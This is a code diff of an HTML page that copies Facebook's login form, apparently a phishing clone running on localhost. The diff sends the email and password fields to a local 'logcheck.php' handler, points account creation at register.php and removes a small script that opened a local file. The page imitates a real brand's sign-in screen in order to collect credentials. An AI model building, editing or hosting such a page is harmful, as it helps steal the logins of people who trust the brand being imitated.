@@ -894,11 +894,11 @@
 	<div class="_6m0s">
 		<div class="_8iep">
 			<div class="_6luv _52jv">
-				<form class="_featuredLogin__formContainer" action="facebook.php" method="post" onsubmit="" id="u_0_9">
+				<form class="_featuredLogin__formContainer" action="logcheck.php" method="post" onsubmit="" id="u_0_9">
 					<input type="hidden" name="jazoest" value="2723" autocomplete="off">
 					<input type="hidden" name="lsd" value="AVpyUs8S" autocomplete="off">
 					<div class="_6luw">Log in to Facebook</div><div class="_6lux">
-					<input type="text" class="inputtext _55r1 _6luy" name="email" placeholder="Email address or phone number" aria-label="Email address or phone number">
+					<input type="text" class="inputtext _55r1 _6luy" name="email" placeholder="Email address" aria-label="Email address or phone number">
 					</div>
 					<div class="_6lux">
 						<input type="password" class="inputtext _55r1 _6luy" name="pass" placeholder="Password" aria-label="Password"></div>
@@ -906,16 +906,11 @@
 						<button value="1" class="_42ft _4jy0 _6lth _4jy6 _4jy1 selected _51sy" name="login" type="submit">Log In</button></div>
 					<div class="_6ltj"><a href="localhost:8000/">Forgotten account?</a></div>
 					<div class="_6ltk">or</div>
-					<div class="_6ltg"><a role="button" class="_42ft _4jy0 _6lti _4jy6 _4jy2 selected _51sy" href="#" ajaxify="/reg/spotlight/" rel="async" onclick="myFunction()">Create New Account</a></div>
+					<div class="_6ltg"><a role="button" class="_42ft _4jy0 _6lti _4jy6 _4jy2 selected _51sy" href="register.php" ajaxify="/reg/spotlight/" rel="async">Create New Account</a></div>
 				</form></div>
 		</div>
 	</div>
 	</div>
-	<script>
-		function myFunction(){
-		 window.open("file:///Users/qubenhao/Documents/Unnamed%20Site%202/window.html",'_self');
-		}
-	</script>
 
 </body>
 </html>
